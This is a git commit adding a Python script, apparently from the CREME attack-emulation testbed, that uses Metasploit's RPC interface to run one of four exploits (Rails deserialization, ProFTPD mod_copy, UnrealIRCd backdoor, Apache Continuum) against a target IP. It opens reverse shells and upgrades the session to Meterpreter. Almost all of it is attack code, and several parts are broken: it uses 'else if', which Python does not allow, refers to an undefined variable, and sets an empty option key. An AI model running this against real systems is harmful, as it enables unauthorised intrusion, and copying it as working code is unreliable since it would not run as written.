e32a3eed0274310995755e518df3f37acf9572b6
ny40ny40ny <ny40ny40ny.cs07@nctu.edu.tw>
2021-09-30 00:33:43 +0800

    新增通用的 FirstStage.py

---
+++ CREME_backend_execution/scripts/configuration/prepared_files/FirstStage.py
@@ -0,0 +1,73 @@
+import time
+import sys
+import os
+from pymetasploit3.msfrpc import MsfRpcClient
+from CREMEapplication.models import AttackScenario
+
+def record_timestamp(folder, output_time_file):
+    output_time_file = os.path.join(folder, output_time_file)
+    with open(output_time_file, "w+") as fw:
+        fw.write('%f' % time.time())
+
+
+def main(argv):
+    if len(argv) != 4:
+        print("Usage: {} Folder local_ip target_ip duration".format(argv[0]))
+
+    folder = argv[1]
+    my_ip = argv[2]
+    target_ip = argv[3]
+
+    client = MsfRpcClient('kali')
+    AS = AttackScenario.objects().all().first()
+    FS = getattr(AS, data_theft_FirstStage)
+    # choose which exploit to use
+    if(FS == "rails_secret_deserialization"):
+        exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
+        payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
+        exploit['RPORT'] = 8181
+        exploit['TARGETURI'] = '/'
+        exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
+        payload['LPORT'] = 4444
+    else if(FS == "proftpd_modcopy_exec"):
+        exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
+        exploit[''] = '/'
+        payload['LPORT'] = 4444
+    else if(FS == "unreal_ircd_3281_backdoor"):
+        exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
+        exploit['RPORT'] = 6697
+        payload['LPORT'] = 4444
+    else if(FS == "apache_continuum_cmd_exec"):
+        exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
+        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
+        
+    exploit['RHOSTS'] = target_ip
+    payload['LHOST'] = my_ip        
+
+    output_time_file = 'time_stage_1_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
+    
+
+    exploit.execute(payload=payload)
+
+    while client.jobs.list:
+        time.sleep(1)
+
+
+    exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
+    exploit['SESSION'] = 1
+    exploit.execute()
+
+    while client.jobs.list:
+        time.sleep(1)
+
+    time.sleep(10)
+    output_time_file = 'time_stage_1_end.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
+
+
+main(sys.argv)
